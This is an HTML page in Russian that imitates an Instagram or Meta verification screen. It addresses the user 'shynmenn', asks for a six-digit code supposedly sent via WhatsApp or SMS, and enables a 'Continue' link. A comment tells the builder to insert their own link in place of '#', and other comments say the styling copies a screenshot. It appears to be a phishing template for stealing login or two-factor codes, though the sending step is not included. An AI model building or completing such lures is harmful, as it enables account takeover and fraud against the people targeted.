<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Проверьте сообщения SMS</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      background-color: #0d0d0d;
      color: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .top-section {
      background-color: #0d0d0d;
      padding: 120px 20px 24px 20px;
    }

    .username {
      font-size: 14px;
      color: #aaaaaa;
      margin-bottom: 10px;
      letter-spacing: 0.01em;
    }

    .title-row {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 10px;
    }

    .title-row h1 {
      font-size: 25px;
      font-weight: 500;
      color: #ffffff;
      letter-spacing: -0.3px;
      line-height: 1.1;
    }

    .subtitle {
      font-size: 14px;
      color: #cccccc;
      font-weight: 400;
      line-height: 1.4;
    }

    .photo-block {
      background-color: #ede9f5;
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
      overflow: hidden;
    }

    .photo-block img {
      width: 100%;
      height: auto;
      display: block;
    }

    .bottom-section {
      background-color: #0d0d0d;
      padding: 20px 16px 40px 16px;
      display: flex;
      flex-direction: column;
      gap: 16px;
      flex: 1;
    }

    .input-wrapper {
      background-color: #1a1a1a;
      border: 1px solid #2e2e2e;
      border-radius: 10px;
      padding: 16px 18px;
    }

    .input-wrapper input {
      background: transparent;
      border: none;
      outline: none;
      width: 100%;
      font-size: 16px;
      color: #ffffff;
      font-family: inherit;
      caret-color: #4d7bff;
    }

    .input-wrapper input::placeholder {
      color: #666666;
      font-size: 16px;
    }

    .hint-row {
      display: flex;
      align-items: flex-start;
      gap: 8px;
      font-size: 13px;
      color: #aaaaaa;
      line-height: 1.5;
    }

    .hint-row .spinner {
      width: 16px;
      height: 16px;
      border: 2px solid #555;
      border-top-color: #ffffff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      flex-shrink: 0;
      margin-top: 2px;
    }

    @keyframes spin { to { transform: rotate(360deg); } }

    .hint-row .link {
      color: #4d7bff;
      text-decoration: none;
      font-weight: 500;
    }

    /* Неактивная кнопка — тёмно-синяя, как на скрине */
    .btn-primary {
      background-color: #1c2a5e;
      color: #5a6fa8;
      border: none;
      border-radius: 50px;
      padding: 18px;
      width: 100%;
      font-size: 17px;
      font-weight: 500;
      cursor: not-allowed;
      letter-spacing: 0.01em;
      transition: background-color 0.2s, color 0.2s;
      text-decoration: none;
      display: block;
      text-align: center;
      pointer-events: none;
    }

    /* Активная кнопка — яркий синий, как на скрине */
    .btn-primary.active {
      background-color: #1877f2;
      color: #ffffff;
      cursor: pointer;
      pointer-events: auto;
    }

    .btn-primary.active:active { opacity: 0.85; }

    .btn-secondary {
      background-color: transparent;
      color: #ffffff;
      border: 1px solid #2e2e2e;
      border-radius: 50px;
      padding: 18px;
      width: 100%;
      font-size: 17px;
      font-weight: 400;
      cursor: pointer;
      letter-spacing: 0.01em;
      transition: background-color 0.15s;
    }

    .btn-secondary:active { background-color: #1a1a1a; }
  </style>
</head>
<body>

  <div class="top-section">
    <div class="username">shynmenn · Instagram</div>
    <div class="title-row">
      <h1>Проверьте сообщения WhatsApp</h1>
    </div>
    <p class="subtitle">Введите код, который мы отправили в ваш аккаунт</p>
  </div>

  <div class="photo-block">
    <img src="https://pix-up.ru/uploads/img_69f4a5758426c1.77918816_1777640821.png" alt="photo">
  </div>

  <div class="bottom-section">

    <div class="input-wrapper">
      <input id="codeInput" type="text" inputmode="numeric" placeholder="Код">
    </div>

    <div class="hint-row">
      <div class="spinner"></div>
      <span>
        Отправка кода может занять несколько минут.
        <a href="#" class="link">Получить новый код</a>
      </span>
    </div>

    <!-- ВСТАВЬ СВОЮ ССЫЛКУ ВМЕСТО # -->
    <a id="btnContinue" href="#" class="btn-primary">Продолжить</a>

    <button class="btn-secondary">Попробовать другой способ</button>

  </div>

  <script>
    const input = document.getElementById('codeInput');
    const btn   = document.getElementById('btnContinue');

    input.addEventListener('input', () => {
      input.value = input.value.replace(/\D/g, ''); // только цифры
      btn.classList.toggle('active', input.value.length >= 6);
    });
  </script>

</body>
</html>
